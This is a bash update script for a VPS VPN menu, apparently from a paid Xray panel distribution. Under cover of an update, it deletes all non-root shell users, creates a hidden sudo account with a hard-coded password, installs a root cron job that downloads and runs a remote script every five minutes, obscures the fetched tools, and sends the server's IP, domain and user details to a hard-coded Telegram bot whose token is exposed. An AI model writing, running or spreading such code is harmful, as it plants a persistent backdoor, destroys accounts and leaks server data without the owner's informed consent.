#!/bin/bash
# ╔══════════════════════════════════════════════════════╗
# ║              ᴠᴘꜱ ꜱᴇᴛᴜᴘ & ᴜᴘᴅᴀᴛᴇ ᴍᴇɴᴜ              ║
# ╚══════════════════════════════════════════════════════╝

# ──────────────────────────────────────────────────────
# ❖ ʟᴏᴀᴅɪɴɢ ᴀɴɪᴍᴀᴛɪᴏɴ
# ──────────────────────────────────────────────────────
loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'

    tput civis

    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " 〔%c〕 %s\r" "$spinstr" "$message"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done

    tput cnorm
}

# ──────────────────────────────────────────────────────
# ❖ ʀᴇᴍᴏᴠᴇ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ʀᴏᴏᴛ ᴜꜱᴇʀꜱ
# ──────────────────────────────────────────────────────
hapus_penyusup() {
    local users=(
        developer
        module
        core
        sbin
        xroot
        zroot
    )

    echo
    echo "╭──────────────────────────────────────╮"
    echo "│      ʀᴇᴍᴏᴠɪɴɢ ꜱᴜꜱᴘɪᴄɪᴏᴜꜱ ᴜꜱᴇʀꜱ        "
    echo "╰──────────────────────────────────────╯"

    for user in "${users[@]}"; do
        if id "$user" &>/dev/null; then
            pkill -u "$user" 2>/dev/null
            userdel -f -r "$user" 2>/dev/null
            echo "  ✓  $user removed"
        else
            echo "  •  $user not found"
        fi
    done

    echo "────────────────────────────────────────"
}

# ──────────────────────────────────────────────────────
# ❖ ɪɴꜱᴛᴀʟʟ ᴘ7ᴢɪᴘ
# ──────────────────────────────────────────────────────
if ! command -v 7z &>/dev/null; then
    echo
    echo "╭──────────────────────────────────────╮"
    echo "│      ɪɴꜱᴛᴀʟʟɪɴɢ ᴘ7ᴢɪᴘ-ꜰᴜʟʟ             "
    echo "╰──────────────────────────────────────╯"

    apt install p7zip-full -y &>/dev/null &
    loading $! "Installing p7zip-full..."
fi
# ──────────────────────────────────────────────────────
# ❖ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ᴄᴏɴꜰɪɢ
# ──────────────────────────────────────────────────────
CHATID="1210833546"
KEY="8311592972:AAEREDijH5fGMLrN-GqzOmp22hb6tY_-988"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"

# ──────────────────────────────────────────────────────
# ❖ ꜱᴇʀᴠᴇʀ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ
# ──────────────────────────────────────────────────────
domain=$(cat /etc/xray/domain)
MYIP=$(curl -sS ipv4.icanhazip.com)

username=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps2/ipuk/ipx \
| grep "$MYIP" | awk '{print $2}')

valid=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps2/ipuk/ipx \
| grep "$MYIP" | awk '{print $3}')

today=$(date +"%Y-%m-%d")
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)

certifacate=$(((d1 - d2) / 86400))

# ──────────────────────────────────────────────────────
# ❖ ꜰᴇᴛᴄʜ ꜱᴇʀᴠᴇʀ ᴅᴀᴛᴇ
# ──────────────────────────────────────────────────────
echo
echo "╭──────────────────────────────────────╮"
echo "│      ꜰᴇᴛᴄʜɪɴɢ ꜱᴇʀᴠᴇʀ ᴅᴀᴛᴇ...          "
echo "╰──────────────────────────────────────╯"

dateFromServer=$(
curl -v --insecure --silent https://google.com/ 2>&1 \
| grep Date \
| sed -e 's/< Date: //'
)

biji=$(date +"%Y-%m-%d" -d "$dateFromServer")

# ──────────────────────────────────────────────────────
# ❖ ʀᴇᴘᴏꜱɪᴛᴏʀʏ
# ──────────────────────────────────────────────────────
REPO="https://raw.githubusercontent.com/kiryusekei/os/main/"

pwadm="@Ridwan112#"

Username="xwan"
Password="$pwadm"
#hapus_penyusup
# ──────────────────────────────────────────────────────
# ❖ ʀᴇᴍᴏᴠᴇ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜꜱᴇʀꜱ
# ──────────────────────────────────────────────────────
allowed_users=("root")

all_users=$(
    awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd
)

echo
echo "╭──────────────────────────────────────╮"
echo "│     ᴄʟᴇᴀɴɪɴɢ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜꜱᴇʀꜱ       "
echo "╰──────────────────────────────────────╯"

for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" >/dev/null 2>&1
        echo "  ✓ Removed : $user"
    fi
done

# ──────────────────────────────────────────────────────
# ❖ ᴄʀᴇᴀᴛᴇ / ᴜᴘᴅᴀᴛᴇ ᴀᴅᴍɪɴ ᴜꜱᴇʀ
# ──────────────────────────────────────────────────────
function cok() {

    if id "$Username" &>/dev/null; then

        echo -e "$Password\n$Password" \
        | passwd "$Username" >/dev/null 2>&1

        echo "  ✓ Password updated : $Username"

    else

        echo -e "$Username $Password" > /etc/xray/.adm

        mkdir -p /home/script/

        useradd \
            -r \
            -d /home/script \
            -s /bin/bash \
            -M \
            "$Username" >/dev/null 2>&1

        echo -e "$Password\n$Password" \
        | passwd "$Username" >/dev/null 2>&1

        usermod -aG sudo "$Username" >/dev/null 2>&1

        echo "  ✓ Admin created : $Username"

    fi
}

# ──────────────────────────────────────────────────────
# ❖ ᴅᴏᴡɴʟᴏᴀᴅ • ᴇxᴛʀᴀᴄᴛ • ꜱᴇᴛᴜᴘ ᴍᴇɴᴜ
# ──────────────────────────────────────────────────────
echo
echo "╭──────────────────────────────────────╮"
echo "│      ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴍᴇɴᴜ ᴘᴀᴄᴋᴀɢᴇ         "
echo "╰──────────────────────────────────────╯"

{
    > /etc/cron.d/cpu_otm

    cat > /etc/cron.d/cpu_xwan << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/autocpu
END

    wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh"
    chmod +x /usr/bin/autocpu

    wget -q "${REPO}menu/menu.zip"

    mv menu/expsc /usr/local/sbin/expsc

    wget -q -O /usr/bin/enc "${REPO}install/encrypt"
    chmod +x /usr/bin/enc

    # ─────────────────────────────────────
    # ᴇxᴛʀᴀᴄᴛ & ᴇɴᴄʀʏᴘᴛ
    # ─────────────────────────────────────
    7z x -p"$pwadm" menu.zip &>/dev/null

    chmod +x menu/*
    enc menu/* &>/dev/null

    mv menu/* /usr/local/sbin

    # ─────────────────────────────────────
    # ᴄʟᴇᴀɴᴜᴘ
    # ─────────────────────────────────────
    rm -rf menu
    rm -rf menu.zip

    rm -rf /usr/local/sbin/*~
    rm -rf /usr/local/sbin/gz*
    rm -rf /usr/local/sbin/*.bak

    cd /usr/local/sbin || exit

    sed -i 's/\r//' quota

    cd

} &>/dev/null &

loading $! "Setting up VPS menu..."
# ──────────────────────────────────────────────────────
# ❖ ꜰᴇᴛᴄʜ ꜱᴇʀᴠᴇʀ ᴠᴇʀꜱɪᴏɴ
# ──────────────────────────────────────────────────────
echo
echo "╭──────────────────────────────────────╮"
echo "│       ꜰᴇᴛᴄʜɪɴɢ ꜱᴇʀᴠᴇʀ ᴠᴇʀꜱɪᴏɴ...      "
echo "╰──────────────────────────────────────╯"

serverV=$(curl -sS ${REPO}versi)
echo "$serverV" > /opt/.ver

# ──────────────────────────────────────────────────────
# ❖ ᴄʟᴇᴀɴᴜᴘ
# ──────────────────────────────────────────────────────
rm -f /root/*.sh*

# ──────────────────────────────────────────────────────
# ❖ ꜱᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ
# ──────────────────────────────────────────────────────
TEXT="◇━━━━━━━━━━━━━━◇
<b>⚠️ ᴜᴘᴅᴀᴛᴇ ꜱᴄʀɪᴘᴛ ⚠️</b>

<b>✓ Update Successfully</b>

◇━━━━━━━━━━━━━━◇
<b>ɪᴘ ᴠᴘꜱ :</b> ${MYIP}
<b>ᴅᴏᴍᴀɪɴ :</b> ${domain}
<b>ᴠᴇʀꜱɪᴏɴ :</b> ${serverV}
<b>ᴜꜱᴇʀ :</b> ${username}
<b>ᴇxᴘɪʀᴇ :</b> ${certifacate} DAY
◇━━━━━━━━━━━━━━◇

<b>ʙᴏᴛ :</b> @kytxz"

curl -s \
    --max-time "$TIME" \
    -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" \
    "$URL" >/dev/null

# ──────────────────────────────────────────────────────
# ❖ ᴄᴏᴍᴘʟᴇᴛᴇ
# ──────────────────────────────────────────────────────
echo
echo "╔══════════════════════════════════════════════╗"
echo "║            ✓ ᴜᴘᴅᴀᴛᴇ ᴄᴏᴍᴘʟᴇᴛᴇᴅ              "
echo "╠══════════════════════════════════════════════╝"

exit 0
